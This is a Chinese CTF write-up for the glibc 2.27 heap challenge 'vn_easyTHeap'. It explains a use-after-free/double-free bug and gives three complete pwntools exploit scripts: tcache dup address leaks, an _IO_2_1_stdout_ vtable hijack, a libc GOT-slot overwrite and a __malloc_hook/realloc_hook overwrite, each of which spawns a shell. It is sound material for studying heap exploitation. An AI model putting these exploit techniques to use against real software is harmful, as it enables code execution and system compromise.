# vn_easyTHeap

## 来源
v & n


## 难度

4 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```

## 简单描述

该环境为glibc 2.27, 有teache机制.题中有五个功能,利用有限制,malloc只能7次以下, free 3次以下.

## vul

```c
int del()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = inputNum();
  if ( v1 < 0 || v1 > 6 || !heap_array[v1] )
    exit(0);
  free((void *)heap_array[v1]);
  size_array[v1] = 0;                           // not set ptr as null, can be double free
  return puts("Done!");
}
```

拥有uaf漏洞,可以使用teache机制double free任意地址分配.

## 打法1

评估: 

复杂度: 比较复杂  成功率: 低

### 知识点

tcache, IO_FILE

### 思路

程序中限制了`malloc`和`free`的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址, 然后通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址,实现任意地址分配.修改IO_2_1_stdout结构, 实现IO流对vtable的调用来触发one_gadget.

### 利用

#### 准备

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'vn_pwn_easyTHeap'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28200


LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
# 这里由于直接查找_IO_str_jumps找不到,可以采取这样的办法查找_IO_str_jumps,也可以通过调试直接找.
def get_IO_str_jumps_offset(): 
	IO_file_jumps_offset = lib.sym['_IO_file_jumps']
	IO_str_underflow_offset = lib.sym['_IO_str_underflow']
	for ref_offset in lib.search(p64(IO_str_underflow_offset)):
		possible_IO_str_jumps_offset = ref_offset - 0x20
		if possible_IO_str_jumps_offset > IO_file_jumps_offset:
			return possible_IO_str_jumps_offset

def ad(size):
	sla('choice: ', str(1))
	sla('?', str(size))

def rm(idx):
	sla('choice: ', str(4))
	sla('?', str(idx))

def md(idx, data):
	sla('choice: ', str(2))
	sla('?', str(idx))
	sla(':', data)

def dp(idx):
	sla('choice: ', str(3))
	sla('?', str(idx))

def q():
	sla('choice: ', str(5))	
```

#### leak heap

```python
	ad(0x100) #idx 0
	ad(0x100) #idx 1

	rm(0) # double free使fd指向自己,下次开辟可以通过修改fd实现任意地址分配
	rm(0)
	# leak heap addr
	dp(0) # 打印自己本身地址
	heap_base = u64(ru('\n') + '\x00\x00') - 0x260
	li('heap_base ' + hex(heap_base))
    
```

#### leak libc

通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址, 那么怎样才能不满足呢,由于程序中最多只能分配7次,就不能使tcache bin的数量大于7了,那只能小于0,怎样才能小于0, 就采用tcache double free之后,就已经形成一个环,若没有修改fd,就一直在原地分配,分配成功后tcache bin的count - 1,当tcache bin的count小于0时,再次释放任何堆,就不会到tcache bin中了.

```python
	# 一直开辟,直到count 小于0
    ad(0x100) # 2 for ajust
	ad(0x100) # 3
    # 这里count 为-1,若开辟后释放,就不会到tcache bin中了
	ad(0x100) # 4
	rm(0)
    # leak heap addr
	dp(0) # 当前的fd就是自己本身的地址,泄漏出heap地址
	heap_base = u64(ru('\n') + '\x00\x00') - 0x260
	li('heap_base ' + hex(heap_base))
```

#### 实现任意地址写入

这里只需修改chunk 0的fd指向我们想要的地方,再次开辟,就会到我们想要修改的地方.

```python
	p = p64(_IO_2_1_stdout_) #修改chunk 0,(因为前几次分配都是重叠在一块chunk上的)的fd指向stdout
	md(3, p)

	ad(0x100) # idx 5 for ajust
	ad(0x100) # idx 6, 开辟到stdout
```

上面任意地址写入已经实现,如果改写malloc_hook或者free_hook,可以改写成功,但是没有办法触发.这是因为，已经用完了add功能的7次调用,delete功能的3次调用,因此,接下来,就调用不了malloc或free,也就无法触发了.因此,可以劫持_IO_2_1_stdout_的虚表.通过IO流对虚表的调用来触发one_gadget.由于glibc为2.29,因此不能直接伪造虚表,而应该将虚表劫持为_IO_str_jumps_附近

```
   0x00007f1fda7b1a65 <+165>:	lea    rdx,[rip+0x366cf4]        # 0x7f1fdab18760 	<_IO_helper_jumps>
   0x00007f1fda7b1a6c <+172>:	lea    rax,[rip+0x367a55]        # 0x7f1fdab194c8
   0x00007f1fda7b1a73 <+179>:	sub    rax,rdx
   0x00007f1fda7b1a76 <+182>:	mov    rcx,r13
   0x00007f1fda7b1a79 <+185>:	sub    rcx,rdx
   0x00007f1fda7b1a7c <+188>:	cmp    rax,rcx
   0x00007f1fda7b1a7f <+191>:	jbe    0x7f1fda7b1b40 <_IO_puts+384>
   0x00007f1fda7b1a85 <+197>:	mov    rdx,rbx
   0x00007f1fda7b1a88 <+200>:	mov    rsi,r12
   0x00007f1fda7b1a8b <+203>:	call   QWORD PTR [r13+0x38] #调用虚表
```

只需要让[r13+0x38]为IO_str_finish函数的指针即可,因此，需要将虚表修改为IO_str_jumps – XX,使得,r13+0x38正好对应上_IO_str_finish指针, 而IO_str_finish函数会call [_IO_2_1_stdout_ + 0xE8]

call的前提是_IO_2_1_stdout_的flag的低1字节要为0. 综上,需要劫持_IO_2_1_stdout_结构体,修改flags,劫持虚表为IO_str_jumps – XX,修改_IO_2_1_stdout_+0xE8处为one_gadget.然后puts的调用即可触发one_gadget

#### 修改IO_2_1_stdout结构体

```python
	p = p64(0xfbad2886) # 要覆盖flag的最低bit为0
    #中间数据保持不变
	p += p64(_IO_2_1_stdout_ + 0x200) * 7
	p += p64(_IO_2_1_stdout_ + 0x201)
	p += p64(0) * 5
	p += p32(1) # file num
	p += p32(0)
	p += p64(0xffffffffffffffff)
	p += p64(0x000000000a000000)
	_IO_stdfile_1_lock = lib.address + (0x7ff3095508c0 - 0x7ff309163000)
	p += p64(_IO_stdfile_1_lock)
	p += p64(0xffffffffffffffff)
	p += p64(0)
	_IO_wide_data_1 = lib.address + (0x7f2fc336a8c0 - 0x7f2fc2f7f000)
	p += p64(_IO_wide_data_1)
	p += p64(0) * 3
	p += p64(0xffffffff)
	p = p.ljust(0xd8, '\x00')
    
    #修改对应IO_str_finish函数指针,该函数会调用IO_2_1_stdout_+0xE8处的函数指针
	p += p64(vtable_jump)
	p += p64(0)
	p += p64(one_gadget) # IO_2_1_stdout_+0xE8处只需修改为one_gadget
	md(6, p)
```

### exp-1

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'vn_pwn_easyTHeap'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28200


LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def get_IO_str_jumps_offset():
	IO_file_jumps_offset = lib.sym['_IO_file_jumps']
	IO_str_underflow_offset = lib.sym['_IO_str_underflow']
	for ref_offset in lib.search(p64(IO_str_underflow_offset)):
		li('AA')
		possible_IO_str_jumps_offset = ref_offset - 0x20
		if possible_IO_str_jumps_offset > IO_file_jumps_offset:
			return possible_IO_str_jumps_offset

def ad(size):
	sla('choice: ', str(1))
	sla('?', str(size))

def rm(idx):
	sla('choice: ', str(4))
	sla('?', str(idx))

def md(idx, data):
	sla('choice: ', str(2))
	sla('?', str(idx))
	sla(':', data)

def dp(idx):
	sla('choice: ', str(3))
	sla('?', str(idx))

def q():
	sla('choice: ', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x100) #idx 0
	ad(0x100) #idx 1

	rm(0)
	rm(0)

	# leak heap addr
	dp(0)
	heap_base = u64(ru('\n') + '\x00\x00') - 0x260
	li('heap_base ' + hex(heap_base))

	ad(0x100) # 2 for ajust
	ad(0x100) # 3
	ad(0x100) # 4 teache count as -1, so free chunk will not be teache bin
	rm(0)

	# leak libc
	_IO_str_jumps_offset = get_IO_str_jumps_offset()

	dp(0)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 96 - 0x3ebc40
	li('libc base ' + hex(lib.address))

	_IO_str_jumps = lib.address + _IO_str_jumps_offset
	_IO_2_1_stdout_ = lib.sym['_IO_2_1_stdout_']

	li('_IO_str_jumps ' + hex(_IO_str_jumps))
	li('_IO_2_1_stdout ' + hex(_IO_2_1_stdout_))
	vtable_jump = _IO_str_jumps - 0x28
	gadget = [0x4f2c5, 0x4f322, 0x10a38c]
	one_gadget = lib.address + gadget[1]

	# can't malloc only to modify _IO_2_1_stdout vtable
	p = p64(_IO_2_1_stdout_) # evil address
	md(3, p)

	ad(0x100) # idx 5 for ajust
	ad(0x100) # idx 6, malloc to our addr

	p = p64(0xfbad2886)
	p += p64(_IO_2_1_stdout_ + 0x200) * 7
	p += p64(_IO_2_1_stdout_ + 0x201)
	p += p64(0) * 5
	p += p32(1) # file num
	p += p32(0)
	p += p64(0xffffffffffffffff)
	p += p64(0x000000000a000000)
	_IO_stdfile_1_lock = lib.address + (0x7ff3095508c0 - 0x7ff309163000)
	p += p64(_IO_stdfile_1_lock)
	p += p64(0xffffffffffffffff)
	p += p64(0)
	_IO_wide_data_1 = lib.address + (0x7f2fc336a8c0 - 0x7f2fc2f7f000)
	p += p64(_IO_wide_data_1)
	p += p64(0) * 3
	p += p64(0xffffffff)
	p = p.ljust(0xd8, '\x00')
	p += p64(vtable_jump)
	p += p64(0)
	p += p64(one_gadget)

	md(6, p)
	#db()


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
```

参考: https://blog.csdn.net/seaaseesa/article/details/105404106

## 打法2

评估: 

复杂度: 一般  成功率: 一般

上面那个调用太复杂了,来个直接的

### 知识点

tcache, libc中的链接原理(与plt与got差不多)

### 思路

程序中限制了`malloc`和`free`的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址, 然后通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址,后面通过还有任意地址分配.将要调用的某个libc中的某个plt函数所对应的跳转地址中的值给改为one_gadget

### 利用

这个获取libc地址的打法与上面一样,就不写了, 主要是获得任意读写地址之后,怎样打one_gadget调用.这个打发就简单得多了,且高效,若所以one_gadget打不通,还可以换其他libc中plt函数来打,打通几率大大提升.

通过调试, 发现在puts中存在一个plt,但是我打了全部one_gadget,就是参数不符合one_gadget,所以在printf中找到一个,如下.ABS*+0xa07f0@plt就是我们的目标了.


```
   0x7f68f522141f <vfprintf+143>    mov    qword ptr [rbp - 0x438], rax
   0x7f68f5221426 <vfprintf+150>    movups xmmword ptr [rbp - 0x448], xmm0
 ► 0x7f68f522142d <vfprintf+157>    call   *ABS*+0xa07f0@plt <0x7f68f51e7040>
        rdi: 0x55d549dc2ff6 ◂— imul   esp, dword ptr [rax + rdi*2 + 0x3f], 0x6e6f6300 /* 'idx?' */
        rsi: 0x25
        rdx: 0x7ffe06e5d790 ◂— 0x3000000008
        rcx: 0x0

```
反编译*ABS*+0xa07f0@plt <0x7f68f51e7040>,获取类似与储存地址的got表地址.0x7f68f55b1048
```
pwndbg> disass 0x7f68f51e7040
Dump of assembler code for function *ABS*+0xa07f0@plt:
   0x00007f68f51e7040 <+0>:	jmp    QWORD PTR [rip+0x3ca002]        # 0x7f68f55b1048
   0x00007f68f51e7046 <+6>:	push   0x28
   0x00007f68f51e704b <+11>:	jmp    0x7f68f51e6fd0
End of assembler dump.
pwndbg> x /40gx 0x7f68f55b1048 # 修改里面的地址为one_gadget就行.
0x7f68f55b1048:	0x00007f68f5277120	0x00007f68f5345c80
0x7f68f55b1058:	0x00007f68f51e7066	0x00007f68f5347490
0x7f68f55b1088:	0x00007f68f5271970	0x00007f68f5350f90
0x7f68f55b1098:	0x00007f68f5271ea0	0x00007f68f55d0250
...  ...
pwndbg> x /10gx 0x00007f68f5277120
0x7f68f5277120 <__strchrnul_sse2>:	0xff25f889ce6e0f66	0x3dc9600f6600000f
0x7f68f5277130 <__strchrnul_sse2+16>:	0xc9610f6600000fc0	0x4d8f0f00c9700f66
0x7f68f5277140 <__strchrnul_sse2+32>:	0x66076f0ff3000001	0x66e06f0f66dbef0f
0x7f68f5277150 <__strchrnul_sse2+48>:	0x66e3740f66c1740f	0x85c0d70f66c4eb0f
0x7f68f5277160 <__strchrnul_sse2+64>:	0x8d48c0bc0f0d74c0	0x0000441f0fc30704
pwndbg>


```

### exp-2

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'vn_pwn_easyTHeap'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28200


LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------

def ad(size):
	sla('choice: ', str(1))
	sla('?', str(size))

def rm(idx):
	sla('choice: ', str(4))
	sla('?', str(idx))

def md(idx, data):
	sla('choice: ', str(2))
	sla('?', str(idx))
	sa(':', data)

def dp(idx):
	sla('choice: ', str(3))
	sla('?', str(idx))

def q():
	sla('choice: ', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x100) #idx 0
	ad(0x100) #idx 1

	rm(0)
	rm(0)

	# leak heap addr
	dp(0)
	heap_base = u64(ru('\n') + '\x00\x00') - 0x260
	li('heap_base ' + hex(heap_base))

	ad(0x100) # 2 for ajust
	ad(0x100) # 3
	ad(0x100) # 4 teache count as -1, so free chunk will not be teache bin
	rm(0)

	# leak libc

	dp(0)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 96 - 0x3ebc40
	li('libc base ' + hex(lib.address))
	ABS = lib.address + (0x7fd855098048 - 0x7fd854cad000)
	gadget = [0x4f2c5, 0x4f322, 0xe569f, 0xe5858, 0xe585f, 0xef863, 0x10a38c, 0x10a398]
	one_gadget = lib.address + gadget[1]

	# can't malloc only to modify _IO_2_1_stdout vtable

	md(3, p64(ABS))

	ad(0x100) # idx 5 for ajust
	li('ABS_got ' + hex(ABS))
	ad(0x100) # idx 6, malloc to our addr

	p = p64(one_gadget)
	#db()
	md(6, p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe569f execve("/bin/sh", r14, r12)
constraints:
  [r14] == NULL || r14 == NULL
  [r12] == NULL || r12 == NULL

0xe5858 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
constraints:
  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe585f execve("/bin/sh", r10, [rbp-0x70])
constraints:
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe5863 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0x10a398 execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL
'''
```



## 打法3

评估: 

复杂度: 一般  成功率: 高

上面那个两个都没有控制好malloc的次数,多了一个,这个就控制少了一个,所以直接修改realloc_hook和malloc_hook打one_gadget.

### 知识点

tcache管理机制

### 思路

程序中限制了malloc 和 free 的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址,且也使该方法打入tcache 管理头部,也就是堆的头部,修改tcahe的数量为7,在释放堆块的时候就不会由tcache bin来管理.这样可以泄漏libc,再次修改该结构,使bin指向malloc - 8处,下次分配直接修改该地址,realloc调参数打one_gadget

### exp-3

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'vn_pwn_easyTHeap'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28200


LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------

def ad(size):
	sla('choice: ', str(1))
	sla('?', str(size))

def rm(idx):
	sla('choice: ', str(4))
	sla('?', str(idx))

def md(idx, data):
	sla('choice: ', str(2))
	sla('?', str(idx))
	sa(':', data)

def dp(idx):
	sla('choice: ', str(3))
	sla('?', str(idx))

def q():
	sla('choice: ', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x100) #idx 0
	ad(0x100) #idx 1

	rm(0)
	rm(0)

	# leak heap addr
	dp(0)
	heap_base = u64(ru('\n') + '\x00\x00') - 0x260
	li('heap_base ' + hex(heap_base))

	ad(0x100) #ixx 2
	md(2, p64(heap_base + 0x10)) #modify as heap base
	ad(0x100) #idx 3
	ad(0x100) #idx 4
	p = p64(0x0)
	p +=p64(0x0700000000000000) # set as max num so free not as tcache bin
	md(4, p)
	rm(0)
	#leak libc
	dp(0)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 96 - 0x3ebc40
	li('libc base ' + hex(lib.address))
	gadget = [0x4f2c5, 0x4f322, 0xe569f, 0xe5858, 0xe585f, 0xef863, 0x10a38c, 0x10a398]
	one_gadget = lib.address + gadget[1]
	p = p64(0x0)
	p +=p64(0x0700000000000000) # set as max num so free not as tcache bin
	p = p.ljust(0xB8, '\x00')
	p += p64(lib.sym['__malloc_hook'] - 8)

	md(4, p)
	ad(0x100) #idx 5
	p = p64(one_gadget)
	p += p64(lib.sym['realloc'] + 8)
	md(5, p)
	#get shell
	#db()
	ad(0x1)



	## can't malloc only to modify _IO_2_1_stdout vtable


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe569f execve("/bin/sh", r14, r12)
constraints:
  [r14] == NULL || r14 == NULL
  [r12] == NULL || r12 == NULL

0xe5858 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
constraints:
  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe585f execve("/bin/sh", r10, [rbp-0x70])
constraints:
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe5863 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0x10a398 execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL
'''

```





